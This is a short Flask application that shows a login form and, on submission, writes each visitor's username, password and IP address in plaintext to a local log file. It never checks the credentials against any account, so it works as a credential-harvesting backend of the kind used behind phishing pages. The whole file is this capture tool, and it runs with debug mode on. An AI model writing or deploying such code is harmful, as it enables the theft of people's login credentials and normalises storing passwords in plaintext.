from flask import Flask, render_template, request, redirect
import datetime

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    # Get real IP address
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    # Save to log file
    with open('log.txt', 'a') as f:
        f.write(f"[{datetime.datetime.now()}] IP: {user_ip} | Username: {username} | Password: {password}\n")

    return render_template('success.html', username=username)

if __name__ == '__main__':
    app.run(debug=True)
